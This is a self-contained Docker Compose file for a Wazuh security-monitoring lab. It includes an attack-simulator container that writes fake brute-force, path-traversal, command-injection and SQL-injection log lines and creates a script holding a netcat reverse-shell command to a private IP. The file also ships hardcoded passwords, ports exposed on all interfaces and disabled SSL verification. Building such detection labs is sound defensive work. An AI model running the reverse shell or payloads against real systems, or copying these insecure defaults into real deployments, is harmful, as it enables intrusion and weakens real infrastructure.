# ============================================================
# Wazuh Complete Ecosystem - Self-Contained Docker Compose
# ============================================================
#
# This setup includes ALL components and requires NO external files.
# All certificates and configurations are generated automatically.
#
# System Requirements:
# - RAM: 8GB minimum (16GB recommended)
# - CPU: 4 cores minimum
# - Disk: 50GB free space
# - OS: Linux, macOS, or WSL2 on Windows
#
# Quick Start:
#   1. docker-compose -f docker-compose-complete-ecosystem.yml up -d
#   2. Wait 2-3 minutes for initialization
#   3. Access dashboard at https://localhost:443 (or https://<WSL_IP>:443)
#
# Credentials:
#   Username: admin
#   Password: SecretPassword
#
# API Access:
#   https://localhost:55000
#
# To find your WSL IP: ip addr show eth0
#
# Note: This uses self-signed certificates. For production, use proper SSL.
#
version: '3.8'

services:
  # ============================================================
  # CERTIFICATE GENERATOR (Runs once at startup)
  # ============================================================
  wazuh-certs-generator:
    image: alpine:3.18
    container_name: wazuh-certs-generator
    hostname: wazuh-certs-generator
    volumes:
      - wazuh-certificates:/certificates
    command: >
      sh -c "
      # Check if certificates already exist
      if [ -f /certificates/admin.pem ]; then
        echo 'Certificates already exist, skipping generation'
        exit 0
      fi

      echo 'Installing required tools...'
      apk add --no-cache curl openssl bash

      echo 'Downloading Wazuh certificate generation tool...'
      curl -so /tmp/wazuh-certs-tool.sh https://packages.wazuh.com/4.7/wazuh-certs-tool.sh
      chmod +x /tmp/wazuh-certs-tool.sh

      # Create config for certificate generation
      cat > /tmp/config.yml <<EOF
      nodes:
        indexer:
          - name: wazuh.indexer
            ip: wazuh.indexer
        server:
          - name: wazuh.manager
            ip: wazuh.manager
        dashboard:
          - name: wazuh.dashboard
            ip: wazuh.dashboard
      EOF

      echo 'Generating certificates...'
      bash /tmp/wazuh-certs-tool.sh -A /tmp/config.yml -ca -v

      echo 'Copying certificates to shared volume...'
      cp -v /tmp/wazuh-certificates/*.pem /certificates/

      # Set proper permissions
      chmod 644 /certificates/*.pem

      echo '========================================='
      echo 'Certificate generation complete!'
      echo '========================================='
      ls -lah /certificates/
      "
    networks:
      - wazuh

  # ============================================================
  # WAZUH INDEXER (OpenSearch) - Data Storage & Search
  # ============================================================
  wazuh.indexer:
    image: wazuh/wazuh-indexer:4.7.2
    container_name: wazuh.indexer
    hostname: wazuh.indexer
    restart: always
    ports:
      - "0.0.0.0:9200:9200"
    environment:
      - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"
      - "bootstrap.memory_lock=true"
      - "discovery.type=single-node"
      - "network.host=0.0.0.0"
      - "plugins.security.ssl.http.enabled=true"
      - "plugins.security.ssl.http.pemcert_filepath=/usr/share/wazuh-indexer/certs/wazuh.indexer.pem"
      - "plugins.security.ssl.http.pemkey_filepath=/usr/share/wazuh-indexer/certs/wazuh.indexer-key.pem"
      - "plugins.security.ssl.http.pemtrustedcas_filepath=/usr/share/wazuh-indexer/certs/root-ca.pem"
      - "plugins.security.ssl.transport.pemcert_filepath=/usr/share/wazuh-indexer/certs/wazuh.indexer.pem"
      - "plugins.security.ssl.transport.pemkey_filepath=/usr/share/wazuh-indexer/certs/wazuh.indexer-key.pem"
      - "plugins.security.ssl.transport.pemtrustedcas_filepath=/usr/share/wazuh-indexer/certs/root-ca.pem"
      - "plugins.security.allow_default_init_securityindex=true"
      - "plugins.security.authcz.admin_dn=CN=admin,OU=Wazuh,O=Wazuh,L=California,C=US"
      - "plugins.security.check_snapshot_restore_write_privileges=true"
      - "plugins.security.enable_snapshot_restore_privilege=true"
      - "plugins.security.nodes_dn=CN=wazuh.indexer,OU=Wazuh,O=Wazuh,L=California,C=US"
      - "plugins.security.restapi.roles_enabled=[\"all_access\",\"security_rest_api_access\"]"
      - "plugins.security.system_indices.enabled=true"
      - "plugins.security.system_indices.indices=[\".opendistro-alerting-config\",\".opendistro-alerting-alert*\",\".opendistro-anomaly-results*\",\".opendistro-anomaly-detector*\",\".opendistro-anomaly-checkpoints\",\".opendistro-anomaly-detection-state\",\".opendistro-reports-*\",\".opendistro-notifications-*\",\".opendistro-notebooks\",\".opensearch-observability\",\".opendistro-asynchronous-search-response*\",\".replication-metadata-store\"]"
      - "cluster.routing.allocation.disk.threshold_enabled=false"
    ulimits:
      memlock:
        soft: -1
        hard: -1
      nofile:
        soft: 65536
        hard: 65536
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer
      - wazuh-certificates:/usr/share/wazuh-indexer/certs:ro
    depends_on:
      wazuh-certs-generator:
        condition: service_completed_successfully
    networks:
      - wazuh

  # ============================================================
  # WAZUH MANAGER - Central Processing & Analysis
  # ============================================================
  wazuh.manager:
    image: wazuh/wazuh-manager:4.7.2
    container_name: wazuh.manager
    hostname: wazuh.manager
    restart: always
    ports:
      - "0.0.0.0:1514:1514"
      - "0.0.0.0:1515:1515"
      - "0.0.0.0:514:514/udp"
      - "0.0.0.0:514:514/tcp"
      - "0.0.0.0:55000:55000"
    environment:
      - INDEXER_URL=https://wazuh.indexer:9200
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=SecretPassword
      - FILEBEAT_SSL_VERIFICATION_MODE=none
      - SSL_CERTIFICATE_AUTHORITIES=/etc/ssl/root-ca.pem
      - SSL_CERTIFICATE=/etc/ssl/filebeat.pem
      - SSL_KEY=/etc/ssl/filebeat-key.pem
      - API_USERNAME=wazuh-wui
      - API_PASSWORD=MyS3cr37P450r.*-
    volumes:
      - wazuh_api_configuration:/var/ossec/api/configuration
      - wazuh_etc:/var/ossec/etc
      - wazuh_logs:/var/ossec/logs
      - wazuh_queue:/var/ossec/queue
      - wazuh_var_multigroups:/var/ossec/var/multigroups
      - wazuh_integrations:/var/ossec/integrations
      - wazuh_active_response:/var/ossec/active-response/bin
      - wazuh_agentless:/var/ossec/agentless
      - wazuh_wodles:/var/ossec/wodles
      - filebeat_etc:/etc/filebeat
      - filebeat_var:/var/lib/filebeat
      - wazuh-certificates:/etc/ssl:ro
    depends_on:
      wazuh-certs-generator:
        condition: service_completed_successfully
      wazuh.indexer:
        condition: service_started
    networks:
      - wazuh

  # ============================================================
  # WAZUH DASHBOARD - Web UI & Visualization
  # ============================================================
  wazuh.dashboard:
    image: wazuh/wazuh-dashboard:4.7.2
    container_name: wazuh.dashboard
    hostname: wazuh.dashboard
    restart: always
    ports:
      - "0.0.0.0:443:5601"
    environment:
      - OPENSEARCH_HOSTS=https://wazuh.indexer:9200
      - WAZUH_API_URL=https://wazuh.manager
      - API_USERNAME=wazuh-wui
      - API_PASSWORD=MyS3cr37P450r.*-
      - OPENSEARCH_USERNAME=admin
      - OPENSEARCH_PASSWORD=SecretPassword
      - SERVER_SSL_ENABLED=true
      - SERVER_SSL_CERTIFICATE=/usr/share/wazuh-dashboard/certs/wazuh.dashboard.pem
      - SERVER_SSL_KEY=/usr/share/wazuh-dashboard/certs/wazuh.dashboard-key.pem
      - OPENSEARCH_SSL_VERIFICATIONMODE=none
    volumes:
      - wazuh-certificates:/usr/share/wazuh-dashboard/certs:ro
      - wazuh-dashboard-config:/usr/share/wazuh-dashboard/data/wazuh/config
      - wazuh-dashboard-custom:/usr/share/wazuh-dashboard/plugins/wazuh/public/assets/custom
    depends_on:
      wazuh-certs-generator:
        condition: service_completed_successfully
      wazuh.indexer:
        condition: service_started
      wazuh.manager:
        condition: service_started
    networks:
      - wazuh

  # ============================================================
  # WAZUH AGENT - Linux Example (SystemA)
  # ============================================================
  wazuh.agent.linux:
    image: ubuntu:22.04
    container_name: wazuh.agent.linux
    hostname: systemA-linux
    restart: always
    environment:
      - WAZUH_MANAGER=wazuh.manager
      - WAZUH_MANAGER_PORT=1514
      - WAZUH_REGISTRATION_PASSWORD=please123
      - WAZUH_AGENT_NAME=systemA-linux
    command: >
      bash -c "
      # Wait for manager to be ready
      echo 'Waiting for Wazuh manager to be ready...'
      sleep 30

      # Update and install dependencies
      echo 'Installing dependencies...'
      apt-get update -qq &&
      apt-get install -y -qq curl gnupg apt-transport-https lsb-release ca-certificates systemctl

      # Add Wazuh repository
      echo 'Adding Wazuh repository...'
      curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import &&
      chmod 644 /usr/share/keyrings/wazuh.gpg &&
      echo 'deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main' | tee -a /etc/apt/sources.list.d/wazuh.list

      # Install Wazuh agent
      echo 'Installing Wazuh agent...'
      apt-get update -qq &&
      WAZUH_MANAGER='wazuh.manager' WAZUH_REGISTRATION_PASSWORD='please123' WAZUH_AGENT_NAME='systemA-linux' apt-get install -y -qq wazuh-agent

      # Configure agent
      echo 'Configuring agent...'
      sed -i 's|<address>MANAGER_IP</address>|<address>wazuh.manager</address>|g' /var/ossec/etc/ossec.conf

      # Enable log monitoring
      cat >> /var/ossec/etc/ossec.conf <<EOF

      <!-- Additional monitoring for test logs -->
      <localfile>
        <log_format>syslog</log_format>
        <location>/var/log/auth.log</location>
      </localfile>
      <localfile>
        <log_format>syslog</log_format>
        <location>/var/log/syslog</location>
      </localfile>
      <syscheck>
        <directories check_all=\"yes\" realtime=\"yes\">/tmp/monitored</directories>
      </syscheck>
      EOF

      # Start agent
      echo 'Starting Wazuh agent...'
      /var/ossec/bin/wazuh-control start

      # Wait a bit for agent to initialize
      sleep 5

      # Register with manager
      echo 'Registering agent with manager...'
      /var/ossec/bin/agent-auth -m wazuh.manager -P please123 -A systemA-linux || echo 'Registration may have already occurred'

      # Restart to apply changes
      /var/ossec/bin/wazuh-control restart

      # Create monitored directories
      mkdir -p /var/log /tmp/monitored
      touch /var/log/auth.log /var/log/syslog

      echo '========================================='
      echo 'Wazuh Agent is now running!'
      echo 'Generating test events every 2 minutes...'
      echo '========================================='

      # Generate test events continuously
      while true; do
        # Simulate SSH login
        echo \"[\$(date '+%b %d %H:%M:%S')] systemA-linux sshd[$$RANDOM]: Accepted password for ubuntu from 192.168.1.50 port 22 ssh2\" >> /var/log/auth.log

        # Simulate system event
        echo \"[\$(date '+%b %d %H:%M:%S')] systemA-linux systemd[1]: Started User Service Example\" >> /var/log/syslog

        # Create/modify files in monitored directory
        echo \"Test data generated at \$(date)\" > /tmp/monitored/test_file_\$(date +%s).txt

        # Show agent status
        echo \"[\$(date)] Agent status check:\"
        /var/ossec/bin/wazuh-control status || true

        # Wait before next event generation
        sleep 120
      done
      "
    volumes:
      - agent_etc:/var/ossec/etc
      - agent_logs:/var/ossec/logs
      - agent_queue:/var/ossec/queue
    depends_on:
      wazuh.manager:
        condition: service_started
    networks:
      - wazuh
    privileged: true

  # ============================================================
  # ATTACK SIMULATOR - Generates Security Events
  # ============================================================
  attack.simulator:
    image: ubuntu:22.04
    container_name: attack.simulator
    hostname: attack-simulator
    restart: always
    command: >
      bash -c "
      echo 'Installing attack simulation tools...'
      apt-get update -qq &&
      apt-get install -y -qq curl wget nmap netcat-openbsd hping3 2>/dev/null ||
      apt-get install -y -qq curl wget nmap netcat-openbsd

      # Create log directories
      mkdir -p /var/log/apache2 /var/log /tmp

      echo '========================================='
      echo 'Attack Simulator is running!'
      echo 'Generating malicious events every minute...'
      echo '========================================='

      while true; do
        # Simulate SSH brute force attack
        echo \"[\$(date '+%b %d %H:%M:%S')] attack-simulator sshd[$$RANDOM]: Failed password for root from 192.168.1.100 port $$RANDOM ssh2\" >> /var/log/auth.log
        echo \"[\$(date '+%b %d %H:%M:%S')] attack-simulator sshd[$$RANDOM]: Failed password for admin from 192.168.1.100 port $$RANDOM ssh2\" >> /var/log/auth.log

        # Simulate web attacks
        echo \"[\$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \\\"GET /admin.php?cmd=cat%20/etc/passwd HTTP/1.1\\\" 403 -\" >> /var/log/apache2/access.log
        echo \"[\$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \\\"GET /../../../etc/shadow HTTP/1.1\\\" 403 -\" >> /var/log/apache2/access.log
        echo \"[\$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \\\"POST /login.php HTTP/1.1\\\" 200 - \\\"' OR '1'='1\\\"\" >> /var/log/apache2/access.log

        # Simulate malware/suspicious file activity
        echo '#!/bin/bash' > /tmp/suspicious_script.sh
        echo 'nc -e /bin/bash 192.168.1.100 4444' >> /tmp/suspicious_script.sh
        chmod +x /tmp/suspicious_script.sh

        # Simulate port scanning (logged activity)
        echo \"[\$(date)] Port scan detected from 192.168.1.100 to ports 1-1000\" >> /var/log/syslog

        # Try to scan the manager (will generate network events)
        timeout 2 nc -zv wazuh.manager 1514 2>/dev/null || true

        echo \"[\$(date)] Attack simulation cycle complete\"
        sleep 60
      done
      "
    volumes:
      - attack-logs:/var/log
    networks:
      - wazuh

# ============================================================
# VOLUMES - Persistent Data Storage
# ============================================================
volumes:
  # Certificates (shared across all components)
  wazuh-certificates:
    driver: local

  # Indexer
  wazuh-indexer-data:
    driver: local

  # Manager
  wazuh_api_configuration:
    driver: local
  wazuh_etc:
    driver: local
  wazuh_logs:
    driver: local
  wazuh_queue:
    driver: local
  wazuh_var_multigroups:
    driver: local
  wazuh_integrations:
    driver: local
  wazuh_active_response:
    driver: local
  wazuh_agentless:
    driver: local
  wazuh_wodles:
    driver: local
  filebeat_etc:
    driver: local
  filebeat_var:
    driver: local

  # Dashboard
  wazuh-dashboard-config:
    driver: local
  wazuh-dashboard-custom:
    driver: local

  # Agent
  agent_etc:
    driver: local
  agent_logs:
    driver: local
  agent_queue:
    driver: local

  # Attack Simulator
  attack-logs:
    driver: local

# ============================================================
# NETWORK - Internal Communication
# ============================================================
networks:
  wazuh:
    driver: bridge
    name: wazuh-network
